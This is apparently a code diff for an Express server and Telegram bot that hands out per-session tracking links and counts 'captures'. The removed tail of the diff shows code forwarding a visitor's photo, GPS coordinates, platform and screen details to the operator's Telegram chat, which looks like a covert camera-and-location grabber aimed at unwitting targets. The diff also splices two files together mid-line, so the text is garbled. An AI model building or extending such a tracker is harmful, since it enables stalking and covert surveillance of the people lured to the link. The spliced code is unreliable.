@@ -47,27 +47,8 @@ app.get('/', (req, res) => {
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'ok',
-    bot: !!process.env.TELEGRAM_BOT_TOKEN
-  });
-});
-
-// Generate unique link
-app.get('/generate-link/:chatId', (req, res) => {
-  const chatId = req.params.chatId;
-  const sessionId = Math.random().toString(36).substring(7);
-  const baseUrl = process.env.BASE_URL || `http://localhost:${PORT}`;
-  const link = `${baseUrl}/?session=${sessionId}`;
-  
-  userSessions.set(sessionId, {
-    chatId: chatId,
-    createdAt: new Date(),
-    captures: 0
-  });
-  
-  res.json({ 
-    success: true, 
-    link: link,
-    sessionId: sessionId
+    bot: !!process.env.TELEGRAM_BOT_TOKEN,
+    timestamp: new Date().toISOString()
   });
 });
 
@@ -227,11 +208,11 @@ bot.onText(/\/generatelink/, async (msg) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '🔗 Copy Link', url: link },
-            { text: '🔄 New Link', callback_data: 'generate_new' }
+            { text: '🔗 Copy Link', url: link }
           ],
           [
-            { text: '📊 View Sessions', callback_data: 'view_sessions' }
+            { text: '🔄 New Link', callback_data: 'generate_new' },
+            { text: '📊 Sessions', callback_data: 'view_sessions' }
           ]
         ]
       }
@@ -311,7 +292,6 @@ bot.on('callback_query', async (query) => {
   const data = query.data;
 
   if (data === 'generate_new') {
-    // Generate new link
     const sessionId = Math.random().toString(36).substring(7);
     const baseUrl = process.env.BASE_URL || `https://your-app.onrender.com`;
     const link = `${baseUrl}/?session=${sessionId}`;
@@ -322,9 +302,8 @@ bot.on('callback_query', async (query) => {
       captures: 0
     });
 
-    bot.sendMessage(chatId, `✅ New link generated:\n\n${link}`);
-  } 
-  else if (data === 'view_sessions') {
+    bot.sendMessage(chatId, `✅ *New link generated!*\n\n\`${link}\``, { parse_mode: 'Markdown' });
+  } else if (data === 'view_sessions') {
     const userSessionsList = Array.from(userSessions.entries())
       .filter(([_, session]) => session.chatId === chatId);
 
@@ -333,12 +312,12 @@ bot.on('callback_query', async (query) => {
       return;
     }
 
-    let message = `📊 Active Sessions: ${userSessionsList.length}\n\n`;
+    let message = `📊 *Active Sessions: ${userSessionsList.length}*\n\n`;
     userSessionsList.forEach(([sessionId, session]) => {
-      message += `• ${sessionId}: ${session.captures} captures\n`;
+      message += `• \`${sessionId}\`: ${session.captures} captures\n`;
     });
 
-    bot.sendMessage(chatId, message);
+    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
   }
 
   bot.answerCallbackQuery(query.id);
@@ -346,11 +325,15 @@ bot.on('callback_query', async (query) => {
 
 // Error handling
 bot.on('polling_error', (error) => {
-  console.error('Polling error:', error);
+  console.error('Polling error:', error.code);
+});
+
+process.on('unhandledRejection', (error) => {
+  console.error('Unhandled rejection:', error);
 });
 
 // Start server
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
   console.log('================================');
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📱 Telegram bot active`);
@@ -363,85 +346,9 @@ setInterval(() => {
   const now = new Date();
   for (const [sessionId, session] of userSessions.entries()) {
     const age = now - session.createdAt;
-    if (age > 24 * 60 * 60 * 1000) { // 24 hours
+    if (age > 24 * 60 * 60 * 1000) {
       userSessions.delete(sessionId);
       console.log(`🗑️ Deleted old session: ${sessionId}`);
     }
   }
-}, 60 * 60 * 1000);      message += `Lng: \`${locationData.longitude}\`\n`;
-      message += `Accuracy: ${locationData.accuracy}m\n\n`;
-    } else {
-      message += `📍 *Location:* Not Available\n\n`;
-    }
-
-    message += `💻 *Device Info:*\n`;
-    message += `Platform: ${browserData.platform || 'Unknown'}\n`;
-    message += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
-    message += `Time: ${new Date(browserData.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n`;
-
-    // Send photo to Telegram
-    console.log('📤 Sending to Telegram...');
-    
-    await bot.sendPhoto(TELEGRAM_CHAT_ID, fs.createReadStream(photoPath), {
-      caption: message,
-      parse_mode: 'Markdown'
-    });
-
-    console.log('✅ Photo sent to Telegram');
-
-    // Send location if available
-    if (locationData.latitude && locationData.longitude) {
-      await bot.sendLocation(
-        TELEGRAM_CHAT_ID,
-        locationData.latitude,
-        locationData.longitude
-      );
-      console.log('✅ Location sent to Telegram');
-    }
-
-    // Delete uploaded file
-    fs.unlinkSync(photoPath);
-    console.log('🗑️ Temp file deleted');
-
-    res.json({ 
-      success: true, 
-      message: 'Data sent to Telegram successfully',
-      timestamp: new Date().toISOString()
-    });
-
-  } catch (error) {
-    console.error('❌ Error:', error);
-    
-    // Clean up file if exists
-    if (req.file && fs.existsSync(req.file.path)) {
-      fs.unlinkSync(req.file.path);
-    }
-    
-    res.status(500).json({ 
-      success: false, 
-      error: error.message,
-      details: error.toString()
-    });
-  }
-});
-
-// 404 handler
-app.use((req, res) => {
-  res.status(404).json({ error: 'Not found' });
-});
-
-// Error handler
-app.use((err, req, res, next) => {
-  console.error('Server Error:', err);
-  res.status(500).json({ error: 'Internal server error' });
-});
-
-// Start server
-app.listen(PORT, '0.0.0.0', () => {
-  console.log('=================================');
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
-  console.log(`📱 Telegram: ${TELEGRAM_TOKEN ? '✅ Configured' : '❌ Missing'}`);
-  console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'}`);
-  console.log('=================================');
-});
+}, 60 * 60 * 1000);
